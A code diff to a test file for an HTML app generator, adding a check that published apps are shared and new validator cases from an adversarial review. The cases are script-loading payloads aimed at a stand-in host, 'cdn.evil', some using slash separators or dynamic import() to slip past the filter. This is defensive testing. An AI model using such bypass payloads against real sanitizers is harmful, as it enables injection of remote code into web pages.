@@ -92,6 +92,8 @@ async def test_forge_happy_path_keeps_html_server_side(forge_env):
     publish_args = forge_env["invoke"][1][2]
     assert publish_args["html"] == app_forge._clean_html(GOOD_HTML)
     assert "cartridge_id" not in publish_args
+    # Shared so every member of the workspace sees it in the gallery.
+    assert publish_args["visibility"] == "shared"
     scope, app_name, html, datasets = forge_env["register"][0]
     assert scope == (TENANT, WORKSPACE)
     assert app_name == "ventas_semana"
@@ -163,6 +165,16 @@ async def test_forge_llm_failure_is_typed_and_publishes_nothing(
     (
         ("<html><script src='https://cdn.evil/x.js'></script></html>" + "x" * 300,
          "scripts externos"),
+        # Empirical bypass cases from the adversarial review: `/` is a valid
+        # attribute separator, so these load external code without a space.
+        ("<html><script/src='https://cdn.evil/x.js'></script></html>" + "x" * 300,
+         "scripts externos"),
+        ("<html><script id=a/src='https://cdn.evil/x.js'></script></html>" + "x" * 300,
+         "scripts externos"),
+        ("<html><script>import('https://cdn.evil/x.js')</script></html>" + "x" * 300,
+         "import"),
+        ("<html><script>import ('https://cdn.evil/x.js')</script></html>" + "x" * 300,
+         "import"),
         ("<html>corto</html>", "demasiado corto"),
         ("<html><script>fetch('/api/data/otra_tabla')</script></html>" + "y" * 300,
          "no autorizados"),
